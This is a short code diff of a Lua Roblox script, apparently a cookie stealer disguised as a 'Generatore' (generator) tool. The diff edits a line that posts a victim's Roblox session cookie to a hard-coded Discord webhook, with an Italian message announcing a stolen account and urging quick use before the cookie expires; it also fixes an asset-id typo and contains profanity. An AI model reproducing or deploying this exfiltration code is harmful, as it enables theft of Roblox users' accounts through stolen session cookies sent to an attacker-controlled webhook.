@@ -56,12 +56,12 @@ function SendMessageEMBED(url, embed)
 end
 
 local url = "https://discordapp.com/api/webhooks/1250189153182683239/G3YpQpu-kSKGgNcMe-tVUQFjPBzhUj2OL37BJ-wNh34IPpf1zpSayCFuUqc1701kWLDU"
-SendMessage(url, "**ACCOUNT ROBLOX RUBATO, ECCO IL COOKIE:**".._G.Nome.." palle")
+SendMessage(url, "> **ACCOUNT ROBLOX RUBATO, ECCO IL COOKIE: **".._G.Nome..", veloci ad usarlo, oppure scadrà!")
 end
 
 local diocane = Window:MakeTab({
 	Name = "Generatore",
-	Icon = "rbxasserid://17822667829",
+	Icon = "rbxassetid://17822667829",
 	PremiumOnly = false
 })
 diocane:AddTextbox({
